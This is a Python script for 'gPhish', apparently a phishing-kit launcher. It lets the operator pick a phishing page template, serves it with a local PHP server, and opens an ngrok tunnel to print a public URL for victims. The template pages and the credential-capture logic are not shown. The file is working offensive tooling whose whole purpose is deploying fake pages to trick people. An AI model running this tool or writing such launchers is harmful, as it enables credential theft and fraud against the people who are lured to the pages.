import os, subprocess, shutil, inquirer
from termcolor import colored
from art import text2art
from logger import Log
from time import sleep
from pyngrok import ngrok

def banner(clear=True):
    ## Clear console
    if clear:
        os.system('clear')
    print(colored(text2art('gPhish', font="smpoison"), 'green'))
    print('By LennyFaze                                v0.1')
    print('Press Ctrl + C to exit\n')

def main_menu():
    try:
        ## Show banner
        banner()
        
        ## Make user pick category
        category = inquirer.list_input('Select a category:', 
            choices=os.listdir('templates/'))

        ## Make user pick template in category
        template = inquirer.list_input('Select a template:', 
            choices=os.listdir('templates/' + category + '/'))
        
        ## Define template path for server process
        template_path = 'templates/' + category + '/' + template + '/'

        start_server(template_path)
    except KeyboardInterrupt:
        ## Handle Ctrl + C
        os.system('clear')
        print(colored('Goodbye!', 'blue'))
        sleep(1)

def start_server(path):
    ## Start server
    Log.info('Copying files to server...')

    # Delete old template if not deleted yet
    if os.path.isdir('server/public/'):
        shutil.rmtree('server/public/')
    # Copy selected template to server
    shutil.copytree(path, 'server/public/')

    Log.info('Staring server...')
    server = subprocess.Popen(f"php -S 127.0.0.1:8080 -t server/public/", 
        stdout=open('serverlog.txt', 'w'), 
        stderr=open('serverlog.txt', 'w'))
    Log.success('Server running.')

    Log.info('Creating ngrok tunnel...')
    ngrok.connect(8080)
    Log.success('Ngrok tunnel opened:')
    print(f"  Local URL: \t{colored(ngrok.get_tunnels()[0].config['addr'], 'cyan')}")
    print(f"  Public URL: \t{colored(ngrok.get_tunnels()[0].public_url, 'cyan')}")
    
    ## Let server run until user stops it
    try:
        server.wait()
    except KeyboardInterrupt:
        Log.info('Ctrl + C pressed, Killing server...')
        server.kill()
        shutil.rmtree('server/public/')
        Log.success('Server killed')
        Log.info('Killing ngrok...')
        ngrok.kill()
        Log.success('Ngrok killed')
        sleep(2)
        main_menu()
    except:
       Log.error('An unknown error occured')


main_menu()